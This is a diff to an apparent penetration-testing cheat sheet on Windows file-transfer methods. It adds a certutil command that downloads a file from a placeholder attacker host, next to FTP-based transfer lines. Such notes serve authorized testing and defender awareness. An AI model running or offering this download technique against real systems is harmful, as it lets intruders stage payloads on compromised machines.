@@ -55,6 +55,10 @@ echo bye >> ftp.txt
 ftp -s:ftp.txt
 
 --------------------------------------
+# CERTUTIL
+certutil -f -urlcache -split http://<ip>/file
+
+--------------------------------------
 
 FTP (pyftpdlib client on Kali)
 # Ftp is generally installed on Windows machines
